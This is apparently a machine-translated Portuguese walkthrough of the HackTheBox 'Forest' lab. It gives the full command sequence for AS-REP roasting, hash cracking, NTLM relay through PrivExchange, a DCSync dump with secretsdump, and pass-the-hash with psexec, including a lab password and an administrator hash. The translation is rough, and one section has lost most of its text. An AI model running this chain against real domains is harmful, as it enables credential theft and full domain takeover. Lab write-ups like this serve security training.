<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏇🏼 💆🏽 👩🏽‍🚒 Corte a caixa - floresta do procedimento. Torrefação AS-REP, DCSync e ataques Pass-The-Hash 🤛🏿 👩🏽‍🌾 👊</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuo publicando soluções enviadas para processamento adicional no site da HackTheBox . Espero que isso ajude pelo menos alguém a se desenvolver no...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Corte a caixa - floresta do procedimento. Torrefação AS-REP, DCSync e ataques Pass-The-Hash</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493478/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/hb/tr/98/hbtr98btoexwyz38jz8ch0fjkkk.png" alt="imagem"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Continuo publicando soluções enviadas para </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">processamento adicional</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> no site da </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Espero que isso ajude pelo menos alguém a se desenvolver no campo da segurança da informação. </font><font style="vertical-align: inherit;">Neste artigo, trataremos do AS-REP Roasting no esquema de autenticação Kerberos, usaremos o BloodHound para reconhecimento de domínio, realizaremos um ataque do DCSync PrivExchange e o ataque Pass-The-Hash. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A conexão ao laboratório é via VPN. </font><font style="vertical-align: inherit;">É recomendável não conectar-se a partir de um computador de trabalho ou de um host em que os dados importantes estejam disponíveis, pois você entra em uma rede privada com pessoas que sabem algo no campo da segurança da informação :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informações Organizacionais</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta máquina possui um endereço IP 10.10.10.161, que eu adiciono ao / etc / hosts. </font></font><br>
<code>10.10.10.161 forest.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, examinamos portas abertas. </font><font style="vertical-align: inherit;">Como leva muito tempo para varrer todas as portas com o nmap, primeiro farei isso com o masscan. </font><font style="vertical-align: inherit;">Examinamos todas as portas TCP e UDP da interface tun0 a uma velocidade de 1000 pacotes por segundo.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/z2/ay/2k/z2ay2kvslyrnctqo05rowzjjp34.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Havia muitas portas abertas no host e decidi garantir que os resultados fornecidos pelo masscan estivessem corretos. </font><font style="vertical-align: inherit;">Para fazer isso, basta escanear o estado das portas no nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap 10.10.10.161 -p135,636,3269,49676,49665,53,593,49671,9389,49667,5985,49666,389,88,49684,464,3268,49677,47001,139,445,49714</code></pre><br>
<img src="https://habrastorage.org/webt/k6/kx/lp/k6kxlpjjub0ar5feglfjwqnw8ei.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas o nmap confirmou tudo. </font><font style="vertical-align: inherit;">Em seguida, você precisa coletar mais informações sobre as portas conhecidas pelo nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001</code></pre><br>
<img src="https://habrastorage.org/webt/dr/9d/eb/dr9debajqi1xhlflvnqexznf2ee.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em seguida, você precisa obter o máximo de informações possível do sistema. </font><font style="vertical-align: inherit;">Para isso, usei o enum4linux. </font><font style="vertical-align: inherit;">Mas ele nos deu pouca informação. </font><font style="vertical-align: inherit;">Grupos, requisitos de senha, falta de SMBv1 e recursos compartilhados, etc. </font><font style="vertical-align: inherit;">No entanto, temos uma lista de usuários.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a 10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/ez/s-/a-/ezs-a-woghvvdj1ln_mbnukpfhm.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como o Kerberos está em execução no host, é necessário verificar se existe uma conta de usuário com o sinalizador DONT_REQ_PREAUTH definido no UAC. Você pode aprender mais sobre os sinalizadores do UAC e o que eles significam </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aqui</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . O sinalizador DONT_REQ_PREAUTH significa que a autenticação Kerberos não é necessária para esta conta. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, descubra quais contas de usuário estão ativas. Isso ajudará a tornar o script samrdump incluído no impacket.</font></font><br>
<br>
<pre><code class="bash hljs">impacket-samrdump forest.htb</code></pre><br>
<img src="https://habrastorage.org/webt/hi/e6/bz/hie6bzhv73inp0umhaetbakwb5s.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/dg/-n/gv/dg-ngvbdgi9ykyhoyncrko68t_i.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script exibe primeiro todos os usuários e, em seguida, informações detalhadas sobre cada um deles. </font><font style="vertical-align: inherit;">Dessa forma, você pode ver que a conta de administrador está ativa e o convidado não. </font><font style="vertical-align: inherit;">Agora podemos fazer uma lista de usuários ativos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/y5/n_/et/y5n_etusel7xf5ziwp1z3yczcxu.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quando temos uma lista de usuários ativos, podemos verificar a disponibilidade da bandeira de que precisamos. </font><font style="vertical-align: inherit;">Podemos fazer isso usando o script GetNPUsers, que também faz parte do pacote impacket. </font><font style="vertical-align: inherit;">Especificamos o domínio htb.local, o controlador de domínio 10.10.10.161, o método de autenticação Kerberos (-k), a opção sem senha e a lista de usuários.</font></font><br>
<br>
<pre><code class="bash hljs">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -k -no-pass -usersfile ADUsers.txt </code></pre><br>
<img src="https://habrastorage.org/webt/hf/hs/ok/hfhsokebytkpia9rd58xen45ugi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
É-nos dito que esse sinalizador não está definido para todos os usuários, exceto svc-alfresco. </font><font style="vertical-align: inherit;">Na minha versão do impacket (21-dev), o hash é solicitado automaticamente.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ponto de Entrada - Torrefação AS-REP</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Algumas palavras sobre o que o hash foi devolvido para nós. </font><font style="vertical-align: inherit;">Abaixo está o esquema de autenticação Kerberos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vs/3a/ib/vs3aib6d1lag5b-mkuuxistyoic.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como você pode ver, no primeiro estágio: o cliente envia uma mensagem com o ID do usuário para o servidor de autenticação AS com a solicitação de serviço em nome do usuário. </font><font style="vertical-align: inherit;">O AS gera uma chave secreta usando hash na senha do usuário encontrado no banco de dados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dessa forma, podemos percorrer o hash e descobrir a senha. </font><font style="vertical-align: inherit;">Esse tipo de ataque é chamado de AS-REP Roasting. </font><font style="vertical-align: inherit;">Salve o hash em um arquivo e encontre o protótipo.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./rockyou.txt hashes2.txt</code></pre><br>
<img src="https://habrastorage.org/webt/ss/k6/9e/ssk69eytthsr6dfxtheeldntuhw.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E encontramos a senha do usuário.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DO UTILIZADOR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se você voltar a abrir portas, poderá encontrar um serviço WinRM em funcionamento (ou Gerenciamento Remoto do Windows) projetado para gerenciamento remoto. </font><font style="vertical-align: inherit;">Temos um nome de usuário e senha, para que possamos nos conectar com segurança. </font><font style="vertical-align: inherit;">Para isso eu uso </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">evil-winrm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jw/iw/kf/jwiwkfl75h-yukol4b7lr5jfpjo.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Então pegamos o usuário.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RAIZ</font></font></h2><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inteligência com BloodHound</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora precisamos aumentar nossos privilégios. Para mapear os caminhos do LPE em um domínio, você pode usar o programa </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Evil-winrm permite fazer upload de arquivos de e para o host. Carreguei no host SharpHound - um módulo para coletar informações. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fe/95/ug/fe95ughqobbdwtby5zpxr6apltc.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Também evil-winrm permite executar scripts do PowerShell. Indicaremos o usuário, a senha e também queremos saber tudo o que é possível. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/ga/-g/8cga-gzy4a3ge7g-beygyg0voia.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Após a execução do script, um arquivo zip aparecerá no diretório atual. Fazemos o download do host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yz/rm/el/yzrmel0cg0xe7buwuli2olplo18.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em seguida, execute o DBMS do gráfico neo4j com o qual o BloodHound trabalha.</font></font><br>
<br>
<pre><code class="bash hljs">neo4j console</code></pre><br>
<img src="https://habrastorage.org/webt/wm/ke/pf/wmkepfwkg0l-bn6o3yniceir-pe.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora execute o BloodHound. </font><font style="vertical-align: inherit;">Uma tela em branco nos encontrará. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gl/kw/hx/glkwhxkprixwilsknm1drmtbbxi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora basta arrastar e soltar o arquivo baixado nele. </font><font style="vertical-align: inherit;">E vá para a guia Consultas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/pl/qx/2hplqxwmjfksk31b5xdqactuz1a.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E dizemos que queremos encontrar os caminhos mais curtos para os administradores do domínio. </font><font style="vertical-align: inherit;">O BloodHound criará um gráfico - o caminho para o nosso progresso consistente. </font><font style="vertical-align: inherit;">Ao clicar em cada nó da rede, receberemos informações sobre ele. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/is/k1/j1/isk1j1t-kzohm6carowrfckpa3g.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Assim, somos informados de que deveríamos nos tornar um membro do grupo Permissões do Windows do Exchange, porque somos tratados com as Contas de Serviço do grupo privilegiado e somente então podemos aumentar os privilégios.</font></font><br>
<br>
<pre><code class="bash hljs">net user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/gd/s0/sy/gds0sybjncodwtlk0iw9vyagfbi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O usuário não está neste grupo atualmente. </font><font style="vertical-align: inherit;">Vamos adicioná-lo e depois verificar os grupos de usuários.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Add-ADGroupMember</span> <span class="hljs-string">"Exchange Windows Permissions"</span> svc<span class="hljs-literal">-alfresco</span></code></pre><br>
<img src="https://habrastorage.org/webt/wo/nc/_1/wonc_1wjiqenlgiegyw3w6cbuhq.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Usuário adicionado ao grupo com sucesso. </font><font style="vertical-align: inherit;">Agora vamos ver o que isso nos dá. </font><font style="vertical-align: inherit;">O grupo Permissões do Windows do Exchange possui direitos WriteDACL (direitos para conceder direitos) ao objeto Domínio no Active Directory, o que permite que qualquer membro do grupo altere os privilégios do domínio, incluindo operações do DCSync.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DCSync</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um pouco sobre o ataque DCSync. A replicação do Active Directory é o processo pelo qual as alterações feitas em um dos controladores de domínio são sincronizadas com o restante dos controladores no domínio. Após a obtenção das permissões necessárias, podemos iniciar uma solicitação de replicação, o que nos permitirá obter dados armazenados no Active Directory, incluindo hashes de senha. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ou seja, podemos sincronizar os hashes das senhas de usuário do Active Directory e efetuar logon em qualquer serviço usando os protocolos NTLM (protocolo de autenticação de rede desenvolvido pela Microsoft) ou o Kerberos. O ataque envolve o uso de duas ferramentas, privexchange.py e ntlmrelayx.py do pacote impacket. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primeiro, execute ntlmrelayx no modo de retransmissão LDAP no controlador de domínio com a conta svc-alfresco.</font></font><br>
<br>
<pre><code class="bash hljs">ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/ks/7h/cd/ks7hcdp2psno63lm-ffqrrdtdyg.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos os serviços estão em execução e aguardam uma conexão. </font><font style="vertical-align: inherit;">Agora use o privex.</font></font><br>
<br>
<pre><code class="bash hljs">python privexchange.py 10.10.10.161 -ah _ip -d htb.local -u svc-alfresco -p s3rvice</code></pre><br>
<img src="https://habrastorage.org/webt/wb/j1/yw/wbj1yw8rduzjd6yapfszi7f7g18.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E então eu cometi muitos erros, remexendo alguns minutos, foi decidido não corrigi-los. </font><font style="vertical-align: inherit;">Você pode seguir o link acima no navegador e passar a autenticação com credenciais svc-alfresco. </font><font style="vertical-align: inherit;">Na janela com ntlmrelayx, veremos as informações de conexão. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d3/aj/hn/d3ajhnw1rgrfauebnrc5pxgvqqe.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora execute o ataque DCSync usando secretsdump.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc</code></pre><br>
<img src="https://habrastorage.org/webt/iy/ma/3c/iyma3ca8u7atdk_kav1cf0qroaq.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bem. </font><font style="vertical-align: inherit;">Conseguimos replicar todas as contas.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ataque Pass-o-Hash</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esse ataque permite que um invasor efetue login em um servidor remoto autenticado usando o protocolo NTLM ou LM. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nos sistemas que usam o protocolo de autenticação NTLM, as senhas nunca são transmitidas em texto não criptografado por um canal de comunicação. Em vez disso, eles são transferidos para o sistema apropriado (como um controlador de domínio) na forma de hashes no estágio de resposta no esquema de autenticação de pergunta e resposta. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Os aplicativos do Windows solicitam a senha do usuário de forma clara e, em seguida, chamam a API (por exemplo, LsaLogonUser), que converte a senha em um hash LM e NTLM e as passa durante o processo de autenticação. A análise dos protocolos mostrou que, para uma autenticação bem-sucedida, não é necessário conhecer a senha de forma clara; apenas seu hash pode ser usado.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O ataque é baseado em uma fraqueza na implementação do protocolo de autenticação de rede. </font><font style="vertical-align: inherit;">Consiste no fato de que os hashes de senha são transmitidos sem o uso de salt e, portanto, permanecem inalterados de sessão para sessão (até que a senha do usuário seja alterada). </font><font style="vertical-align: inherit;">Em outras palavras, para um invasor, os hashes de senha são equivalentes às próprias senhas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Realize um ataque usando o psexec.</font></font><br>
<br>
<pre><code class="bash hljs">psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/iz/wl/bf/izwlbfbysatzgxcnwmjxw1of6us.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos em um sistema com plenos direitos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Você pode se juntar a nós no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vamos montar uma comunidade na qual haverá pessoas versadas em muitas áreas da TI, para que possamos sempre ajudar-nos mutuamente em qualquer problema de segurança da informação e da TI.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt493452/index.html">Desfoque da imagem de fundo do Unity</a></li>
<li><a href="../pt493458/index.html">Liberte seu Android - Alaverdi</a></li>
<li><a href="../pt493462/index.html">Banho ultrassonico. Parte 2</a></li>
<li><a href="../pt493468/index.html">Não tenha medo de respirar profundamente</a></li>
<li><a href="../pt493470/index.html">Cientistas encontram novos planetas pequenos fora de Netuno</a></li>
<li><a href="../pt493480/index.html">Arquitetura para iniciantes ou por que você não precisa inserir uma bandeira no homem-espada</a></li>
<li><a href="../pt493482/index.html">Conheça a tartaruga cibernética, o antecessor do Roomba</a></li>
<li><a href="../pt493484/index.html">Seu C # já está "funcional", apenas deixe.</a></li>
<li><a href="../pt493486/index.html">As startups automotivas mais interessantes 2019-2020</a></li>
<li><a href="../pt493488/index.html">Unidade + git = amizade: parte 1 conjunto de cavalheiros</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>